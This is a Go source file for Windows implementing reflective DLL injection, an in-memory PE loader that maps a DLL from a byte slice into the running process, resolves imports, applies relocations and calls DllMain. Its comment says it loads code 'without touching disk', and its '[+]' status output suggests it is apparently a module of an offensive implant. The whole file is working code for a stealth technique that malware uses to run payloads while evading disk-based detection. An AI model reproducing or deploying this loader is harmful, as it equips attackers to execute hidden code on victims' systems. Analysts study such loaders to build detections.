//go:build windows

package main

import (
	"encoding/binary"
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ─── Reflective DLL Injection (in-memory PE loader) ─────────────────────────
//
// Maps a DLL from a byte slice into memory without touching disk.
// Steps:
//   1. Parse DOS → NT headers
//   2. Allocate virtual memory (preferred base first, then any)
//   3. Copy PE headers and sections
//   4. Process import directory (LoadLibrary + GetProcAddress)
//   5. Process base relocations (if alloc != preferred base)
//   6. Mark sections with correct page protections
//   7. Call DllMain(DLL_PROCESS_ATTACH)

const (
	DLL_PROCESS_ATTACH = 1
	DLL_PROCESS_DETACH = 0

	IMAGE_DIRECTORY_ENTRY_EXPORT   = 0
	IMAGE_DIRECTORY_ENTRY_IMPORT   = 1
	IMAGE_DIRECTORY_ENTRY_BASERELOC = 5

	IMAGE_ORDINAL_FLAG64 = uint64(0x8000000000000000)

	IMAGE_REL_BASED_ABSOLUTE = 0
	IMAGE_REL_BASED_DIR64    = 10

	PAGE_NOACCESS          = 0x01
	PAGE_READONLY          = 0x02
	PAGE_READWRITE_PROT    = 0x04
	PAGE_WRITECOPY         = 0x08
	PAGE_EXECUTE_PROT      = 0x10
	PAGE_EXECUTE_READ_PROT = 0x20
	PAGE_EXECUTE_READWRITE_PROT = 0x40
)

// reflectiveDLLLoad maps a DLL image from dllBytes into the current process.
// Returns a status string and optionally calls an exported function.
func reflectiveDLLLoad(dllBytes []byte) (string, error) {
	if len(dllBytes) < 0x40 {
		return "", fmt.Errorf("buffer too small for DOS header")
	}

	// ── Parse DOS header ─────────────────────────────────────────────────────
	if binary.LittleEndian.Uint16(dllBytes[0:]) != 0x5A4D { // MZ
		return "", fmt.Errorf("not a valid PE (no MZ)")
	}
	ntOff := binary.LittleEndian.Uint32(dllBytes[0x3C:])
	if int(ntOff)+0xF8 > len(dllBytes) {
		return "", fmt.Errorf("NT headers out of range")
	}
	if binary.LittleEndian.Uint32(dllBytes[ntOff:]) != 0x00004550 { // PE\0\0
		return "", fmt.Errorf("invalid PE signature")
	}

	// IMAGE_NT_HEADERS64 offsets:
	machine      := binary.LittleEndian.Uint16(dllBytes[ntOff+4:])
	numSec       := int(binary.LittleEndian.Uint16(dllBytes[ntOff+6:]))
	optHdrSize   := binary.LittleEndian.Uint16(dllBytes[ntOff+20:])
	entryRVA     := binary.LittleEndian.Uint32(dllBytes[ntOff+40:])
	imageBase    := binary.LittleEndian.Uint64(dllBytes[ntOff+48:])
	imageSize    := binary.LittleEndian.Uint32(dllBytes[ntOff+80:])
	hdrSize      := binary.LittleEndian.Uint32(dllBytes[ntOff+84:])

	if machine != 0x8664 {
		return "", fmt.Errorf("only AMD64 DLLs supported (got 0x%X)", machine)
	}

	// ── Allocate memory ───────────────────────────────────────────────────────
	base, err := windows.VirtualAlloc(
		uintptr(imageBase), uintptr(imageSize),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if err != nil || base == 0 {
		// Preferred base unavailable — allocate anywhere
		base, err = windows.VirtualAlloc(0, uintptr(imageSize),
			windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
		if err != nil {
			return "", fmt.Errorf("VirtualAlloc: %w", err)
		}
	}

	mem := (*[1 << 30]byte)(unsafe.Pointer(base))

	// ── Copy PE headers ───────────────────────────────────────────────────────
	copy(mem[:hdrSize], dllBytes[:hdrSize])

	// ── Copy sections ─────────────────────────────────────────────────────────
	secTableOff := ntOff + 24 + uint32(optHdrSize)
	for i := 0; i < numSec; i++ {
		secOff := secTableOff + uint32(i)*40
		if int(secOff)+40 > len(dllBytes) {
			break
		}
		vaddr    := binary.LittleEndian.Uint32(dllBytes[secOff+12:])
		rawSize  := binary.LittleEndian.Uint32(dllBytes[secOff+16:])
		rawOff   := binary.LittleEndian.Uint32(dllBytes[secOff+20:])
		virtSize := binary.LittleEndian.Uint32(dllBytes[secOff+8:])
		if virtSize == 0 {
			virtSize = rawSize
		}
		if rawSize > 0 && int(rawOff+rawSize) <= len(dllBytes) {
			copy(mem[vaddr:int(vaddr)+int(rawSize)], dllBytes[rawOff:rawOff+rawSize])
		}
	}

	// ── Process import table ──────────────────────────────────────────────────
	importDirRVA := binary.LittleEndian.Uint32(dllBytes[ntOff+136:])
	importDirSz  := binary.LittleEndian.Uint32(dllBytes[ntOff+140:])
	if importDirRVA != 0 && importDirSz != 0 {
		if err := processImports(base, mem[:], importDirRVA); err != nil {
			windows.VirtualFree(base, 0, windows.MEM_RELEASE)
			return "", fmt.Errorf("imports: %w", err)
		}
	}

	// ── Apply relocations (if base differs from preferred) ───────────────────
	delta := int64(base) - int64(imageBase)
	if delta != 0 {
		relocRVA := binary.LittleEndian.Uint32(dllBytes[ntOff+168:])
		if relocRVA != 0 {
			processRelocations(base, mem[:], relocRVA, delta)
		}
	}

	// ── Apply section page protections ───────────────────────────────────────
	applyProtections(base, mem[:], secTableOff, numSec, dllBytes)

	// ── Call DllMain ─────────────────────────────────────────────────────────
	entryPoint := base + uintptr(entryRVA)
	if entryRVA != 0 {
		ret, _, _ := syscallN3(entryPoint, base, DLL_PROCESS_ATTACH, 0)
		if ret == 0 {
			windows.VirtualFree(base, 0, windows.MEM_RELEASE)
			return "", fmt.Errorf("DllMain returned FALSE")
		}
	}

	return fmt.Sprintf("[+] DLL loaded at 0x%X (size %d, delta %+d)", base, imageSize, delta), nil
}

// processImports walks the IMAGE_IMPORT_DESCRIPTOR array and resolves each function.
func processImports(base uintptr, mem []byte, importDirRVA uint32) error {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	loadLib  := kernel32.NewProc("LoadLibraryA")
	getProc  := kernel32.NewProc("GetProcAddress")

	for off := importDirRVA; ; off += 20 {
		if int(off)+20 > len(mem) {
			break
		}
		// IMAGE_IMPORT_DESCRIPTOR
		originalThunk := binary.LittleEndian.Uint32(mem[off:])
		nameRVA       := binary.LittleEndian.Uint32(mem[off+12:])
		firstThunk    := binary.LittleEndian.Uint32(mem[off+16:])

		if nameRVA == 0 {
			break // null terminator
		}

		dllNameBytes := nullTermStr(mem, nameRVA)
		hDLL, _, err := loadLib.Call(uintptr(unsafe.Pointer(&dllNameBytes[0])))
		if hDLL == 0 {
			return fmt.Errorf("LoadLibraryA(%s): %w", string(dllNameBytes[:len(dllNameBytes)-1]), err)
		}

		thunk := firstThunk
		hint  := originalThunk
		if hint == 0 {
			hint = firstThunk
		}

		for ; ; thunk, hint = thunk+8, hint+8 {
			if int(hint)+8 > len(mem) {
				break
			}
			thunkVal := binary.LittleEndian.Uint64(mem[hint:])
			if thunkVal == 0 {
				break
			}
			var procAddr uintptr
			if thunkVal&IMAGE_ORDINAL_FLAG64 != 0 {
				// Import by ordinal
				ord := thunkVal & 0xFFFF
				procAddr, _, _ = getProc.Call(hDLL, uintptr(ord))
			} else {
				// Import by name (IMAGE_IMPORT_BY_NAME: 2-byte hint + name)
				nameOff := uint32(thunkVal) + 2
				funcName := nullTermStr(mem, nameOff)
				procAddr, _, _ = getProc.Call(hDLL, uintptr(unsafe.Pointer(&funcName[0])))
			}
			if procAddr == 0 {
				// Non-fatal: leave as zero (optional imports)
				continue
			}
			binary.LittleEndian.PutUint64(mem[thunk:], uint64(procAddr))
		}
	}
	return nil
}

// processRelocations applies base relocation fixups.
func processRelocations(base uintptr, mem []byte, relocRVA uint32, delta int64) {
	off := relocRVA
	for {
		if int(off)+8 > len(mem) {
			break
		}
		pageRVA    := binary.LittleEndian.Uint32(mem[off:])
		blockSize  := binary.LittleEndian.Uint32(mem[off+4:])
		if blockSize == 0 {
			break
		}
		numEntries := (blockSize - 8) / 2
		for i := uint32(0); i < numEntries; i++ {
			entOff := off + 8 + i*2
			if int(entOff)+2 > len(mem) {
				break
			}
			entry := binary.LittleEndian.Uint16(mem[entOff:])
			relType := entry >> 12
			relOff  := uint32(entry & 0xFFF)
			patchOff := pageRVA + relOff
			if relType == IMAGE_REL_BASED_DIR64 {
				if int(patchOff)+8 <= len(mem) {
					cur := binary.LittleEndian.Uint64(mem[patchOff:])
					binary.LittleEndian.PutUint64(mem[patchOff:], uint64(int64(cur)+delta))
				}
			}
		}
		off += blockSize
	}
}

// applyProtections sets correct VirtualProtect flags per section characteristics.
func applyProtections(base uintptr, mem []byte, secTableOff uint32, numSec int, raw []byte) {
	for i := 0; i < numSec; i++ {
		off := secTableOff + uint32(i)*40
		if int(off)+40 > len(raw) {
			break
		}
		vaddr      := uintptr(binary.LittleEndian.Uint32(raw[off+12:]))
		virtSize   := uintptr(binary.LittleEndian.Uint32(raw[off+8:]))
		rawSize    := uintptr(binary.LittleEndian.Uint32(raw[off+16:]))
		chars      := binary.LittleEndian.Uint32(raw[off+36:])
		if virtSize == 0 {
			virtSize = rawSize
		}
		if virtSize == 0 {
			continue
		}

		var prot uint32
		exec  := chars&IMAGE_SCN_MEM_EXECUTE != 0
		read  := chars&IMAGE_SCN_MEM_READ != 0
		write := chars&IMAGE_SCN_MEM_WRITE != 0

		switch {
		case exec && write:
			prot = windows.PAGE_EXECUTE_READWRITE
		case exec && read:
			prot = windows.PAGE_EXECUTE_READ
		case exec:
			prot = windows.PAGE_EXECUTE
		case write:
			prot = windows.PAGE_READWRITE
		case read:
			prot = windows.PAGE_READONLY
		default:
			prot = windows.PAGE_NOACCESS
		}

		var old uint32
		windows.VirtualProtect(base+vaddr, virtSize, prot, &old)
	}
}

// nullTermStr returns a null-terminated byte slice including the null byte.
func nullTermStr(mem []byte, rva uint32) []byte {
	if int(rva) >= len(mem) {
		return []byte{0}
	}
	end := rva
	for int(end) < len(mem) && mem[end] != 0 {
		end++
	}
	result := make([]byte, end-rva+1)
	copy(result, mem[rva:end])
	result[len(result)-1] = 0
	return result
}

// syscallN3 calls a 3-arg function at addr (no CGo needed).
func syscallN3(addr, a1, a2, a3 uintptr) (uintptr, uintptr, error) {
	r1, r2, err := syscall.SyscallN(addr, a1, a2, a3)
	return r1, r2, err
}
